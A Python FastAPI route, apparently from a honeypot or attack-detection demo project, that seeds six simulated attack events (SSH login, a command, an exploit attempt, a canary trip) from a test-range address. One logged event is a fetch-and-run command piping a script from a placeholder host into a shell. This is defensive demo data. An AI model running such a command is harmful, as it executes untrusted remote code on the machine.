from __future__ import annotations

import uuid
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.dependencies import get_current_user, get_db
from app.config import settings
from app.models.event import AttackEvent, EventType
from app.services.event_processor import process_event

router = APIRouter()


class DemoRunOut(BaseModel):
    session_id: str
    events_created: int
    message: str


@router.post("/run", response_model=DemoRunOut)
async def run_demo(
    db: AsyncSession = Depends(get_db),
    _user: str = Depends(get_current_user),
):
    if not settings.demo_mode:
        raise HTTPException(status_code=403, detail="Demo mode is disabled")
    session_id = f"demo-{uuid.uuid4().hex[:12]}"
    attacker_ip = "198.51.100.42"  # TEST-NET-2, never a real attacker address.
    sequence = [
        (EventType.CONNECTION, "SSH connection accepted by local lab decoy", 0, None),
        (EventType.LOGIN_ATTEMPT, "Failed password for admin from 198.51.100.42", 0, "admin"),
        (EventType.LOGIN_SUCCESS, "Accepted password for deploy from 198.51.100.42", 0, "deploy"),
        (EventType.COMMAND, "curl -fsSL http://example.invalid/bootstrap.sh | sh", 0, "deploy"),
        (EventType.EXPLOIT_ATTEMPT, "HTTP decoy: attempted /admin/export?format=sql", 0, None),
        (EventType.CANARY_TRIP, "Demo URL canary callback from simulated attacker", 0, None),
    ]
    for event_type, raw_log, score, username in sequence:
        event = AttackEvent(
            event_type=event_type,
            source_ip=attacker_ip,
            source_port=49152,
            username=username,
            raw_log=raw_log,
            parsed_data={"source": "demo_scenario", "simulated": True, "scenario": "credential-to-exfiltration"},
            session_id=session_id,
            threat_score=score,
            timestamp=datetime.now(timezone.utc),
        )
        db.add(event)
        await db.flush()
        # Portfolio demos must be fast, reproducible, offline, and free of API cost.
        await process_event(db, event, use_llm=False)
    return DemoRunOut(session_id=session_id, events_created=len(sequence), message="Simulated attack chain ingested")
